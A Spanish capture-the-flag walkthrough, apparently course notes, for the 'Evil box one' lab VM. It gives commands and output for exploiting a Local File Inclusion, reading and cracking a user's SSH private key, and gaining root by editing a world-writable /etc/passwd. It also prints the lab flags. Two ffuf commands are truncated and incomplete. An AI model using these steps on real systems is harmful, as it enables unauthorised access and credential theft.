---
title: "🖥️ Máquina: Evil box one — Hacking Ético"
aliases:
  - Evil box one
  - evilbox
  - Máquina Evil box one
  - VM Evil box one
  - Writeup Evil box one
tags:
  - ifct0109
  - hacking-etico
  - vms
  - vulnerabilidades-web
  - linux
  - ctf
---

# 🖥️ Máquina: Evil box one

> [!abstract] Ficha Técnica del Laboratorio
> **Sistema Operativo:** Linux  
> **Categoría:** Vulnerabilidades Web  
> **Técnicas trabajadas:** Fuzzing web · Local File Inclusion · Enumeración con LFI · Lectura de clave privada SSH · Cracking de passphrase (ssh2john) · Escalada de privilegios (escritura en /etc/passwd)  
> **Descripción:** En esta práctica descubriremos un parámetro LFI en un PHP oculto, leeremos una clave privada SSH protegida con contraseña, la crackearemos con john y accederemos al sistema. La escalada de privilegios se realiza editando directamente /etc/passwd, que tiene permisos de escritura para todos los usuarios, para establecer una contraseña conocida en el usuario root.  
> 
> 🔗 **Navegación:** [[02 - MODULOS/Hacking Ético/03 - Máquinas Hackeables (VMs)|⬅️ Catálogo de Máquinas Hackeables]] &emsp;|&emsp; [[02 - MODULOS/04 - Hacking Ético|🧪 Hacking Ético]] &emsp;|&emsp; [[00 - INDICE|🏠 Inicio]]

---

## ⚙️ Configuración del Entorno de Red

Para ejecutar los comandos en tu laboratorio local (Red NAT):

* **`LHOST` (Atacante / Kali Linux):** Ej. `10.0.0.44`
* **`RHOST` (Víctima / Evil box one):** Ej. `10.0.0.51`

> [!tip] Detección Previa de IP Víctima
> Si no conoces la IP asignada a la máquina Evil box one tras encenderla, ejecuta en Kali:
> ```bash
> sudo netdiscover -r 10.0.0.0/24
> ```

---

## 🔎 Fase 1: Enumeración de servicios

```bash
nmap -sT -p- 10.0.0.51
```

```text
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

> [!info] Resultado
> Dos puertos: SSH y un servidor web. Comenzamos enumerando la web con gobuster:

---

## 🌐 Fase 2: Enumeración web

```bash
gobuster dir -r -u http://10.0.0.51/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
```

```text
/index.html  (Status: 200) [Size: 10701]
/robots.txt  (Status: 200) [Size: 12]
/secret      (Status: 200) [Size: 4]
```

> [!info] Resultado
> Encontramos un directorio /secret y el archivo robots.txt. Revisamos robots.txt:

```bash
curl http://10.0.0.51/robots.txt
```

```text
Hello H4x0r
```

> [!info] Resultado
> Solo un mensaje, sin rutas útiles. Enumeramos en profundidad el directorio /secret:

```bash
gobuster dir -r -u http://10.0.0.51/secret -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
```

```text
/index.html  (Status: 200) [Size: 4]
/evil.php    (Status: 200) [Size: 0]
```

> [!info] Resultado
> Encontramos evil.php. La respuesta tiene tamaño 0, lo que indica que el PHP existe pero no muestra nada sin los parámetros correctos. Usamos ffuf para descubrir qué parámetro GET acepta, probando si alguno nos permite leer /etc/passwd. Filtramos con -fs 0 para ignorar las respuestas vacías:

---

## 🔍 Fase 3: Descubrimiento de parámetro LFI

```bash
ffuf -c -r -u
```

```text
command  [Status: 200, Size: 1398, Words: 13, Lines: 27]
```

> [!info] Resultado
> El parámetro vulnerable es command. La aplicación acepta una ruta de archivo a través de este parámetro y devuelve su contenido, una vulnerabilidad de Local File Inclusion (LFI). Verificamos leyendo /etc/passwd:

```bash
curl http://10.0.0.51/secret/evil.php?command=/etc/passwd
```

```text
root:x:0:0:root:/root:/bin/bash
mowree:x:1000:1000:mowree,,,:/home/mowree:/bin/bash
...
```

> [!info] Resultado
> Dos usuarios con shell: root y mowree. Con un LFI activo podemos leer cualquier archivo al que tenga acceso el proceso web. Kali incluye diccionarios específicos para enumerar archivos interesantes en sistemas Linux mediante LFI:

```bash
ffuf -c -r -u
```

```bash
curl http://10.0.0.51/secret/evil.php?command=php://filter/read=convert.base64-encode/resource=evil.php | base64 -d
```

---

## 🔑 Fase 4: Lectura de clave privada SSH

Intentamos leer la clave privada SSH del usuario mowree, que suele estar en ~/.ssh/id_rsa:

```bash
curl http://10.0.0.51/secret/evil.php?command=/home/mowree/.ssh/id_rsa
```

```text
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: DES-EDE3-CBC,9FB14B3F3D04E90E

uuQm2CFIe/eZT5pNyQ6+K1Uap/FYWcsEklzONt+x4AO6FmjFmR8RUpwMHurmbRC6
8kOVjIjFKkGQ4rNRWKVoo/HaRoI/f2G6tbEiOVclUMT8iutAg8S4VA==
-----END RSA PRIVATE KEY-----
```

> [!info] Resultado
> La clave privada existe y podemos leerla. La cabecera Proc-Type: 4,ENCRYPTED indica que está protegida con contraseña. La guardamos en un archivo local:

```bash
curl http://10.0.0.51/secret/evil.php?command=/home/mowree/.ssh/id_rsa > id_rsa_evilbox
```

```bash
chmod 600 id_rsa_evilbox
```

> [!info] Resultado
> El permiso 600 es obligatorio para que SSH acepte el archivo de clave. Si tiene permisos más abiertos SSH lo rechaza por seguridad. Intentamos conectar para confirmar que nos pide contraseña:

---

## 🔓 Fase 5: Cracking de la passphrase con ssh2john

Convertimos la clave al formato que john puede procesar con ssh2john, y luego lanzamos el cracking con rockyou:

```bash
ssh2john id_rsa_evilbox > hash_evilbox
```

```bash
john hash_evilbox --wordlist=/usr/share/wordlists/rockyou.txt
```

```text
unicorn          (id_rsa_evilbox)
```

> [!info] Resultado
> Passphrase encontrada: unicorn. Ya podemos autenticarnos con la clave y esta contraseña:

```bash
ssh -i id_rsa_evilbox mowree@10.0.0.51
```

```text
Enter passphrase for key 'id_rsa_evilbox': unicorn
```

```bash
cat user.txt
```

```text
56Rbp0soobpzWSVzKh9YOvzGLgtPZQ
```

> [!info] Resultado
> Flag de usuario obtenida: 56Rbp0soobpzWSVzKh9YOvzGLgtPZQ

---

## 🚀 Fase 6: Escalada de privilegios — escritura en /etc/passwd

Buscamos archivos con permisos de escritura para todos los usuarios:

```bash
find / -type f -perm -006 2>/dev/null | egrep -v "var|sys|proc"
```

```text
/etc/passwd
```

```bash
ls -l /etc/passwd
```

```text
-rw-rw-rw- 1 root root 1398 ago 16  2021 /etc/passwd
```

> [!info] Resultado
> /etc/passwd tiene permisos de escritura para todos (rw-rw-rw-). En sistemas Linux modernos las contraseñas se almacenan en /etc/shadow, y en /etc/passwd el campo de contraseña contiene una x que indica que debe consultarse shadow. Sin embargo, si sustituimos esa x por un hash de contraseña generado por nosotros, el sistema lo usará directamente y podremos autenticarnos con esa contraseña sin necesidad de acceder a shadow.
> Generamos un hash MD5 con una contraseña conocida. El hash será diferente cada vez que se ejecute porque openssl usa un salt aleatorio, así que copia el resultado que obtengas tú:

```bash
openssl passwd -1 SegInf
```

```text
$1$7o3StH1d$7rO130pvl1KslCqdSoGAh1
```

> [!info] Resultado
> Copiamos el hash generado. Ahora editamos /etc/passwd y sustituimos la x del usuario root por ese hash:

```bash
nano /etc/passwd
```

> [!info] Resultado
> Buscamos la línea de root y la dejamos así (usando el hash que hayas generado tú):
> root:$1$7o3StH1d$7rO130pvl1KslCqdSoGAh1:0:0:root:/root:/bin/bash
> Guardamos con CTRL+O, confirmamos con Enter y salimos con CTRL+X.

```bash
su root
```

```text
Contraseña: SegInf
```

```bash
id
```

```text
uid=0(root) gid=0(root) grupos=0(root)
```

```bash
cd /root
```

```bash
cat root.txt
```

```text
36QtXfdJWvdC0VavlPIApUbDlqTsBM
```

> [!info] Resultado
> Flag de root obtenida: 36QtXfdJWvdC0VavlPIApUbDlqTsBM

---

> [!note] 🔗 Enlaces Relacionados
> * 💻 [[02 - MODULOS/Hacking Ético/03 - Máquinas Hackeables (VMs)|Volver al Catálogo de Máquinas Hackeables]]
> * 🌐 [[02 - MODULOS/Hacking Ético/01 - Web Fuzzing|Guía de Web Fuzzing]]
> * 🔍 [[02 - MODULOS/Hacking Ético/02 - Reconocimiento Bug Bounty|Metodología de Reconocimiento]]
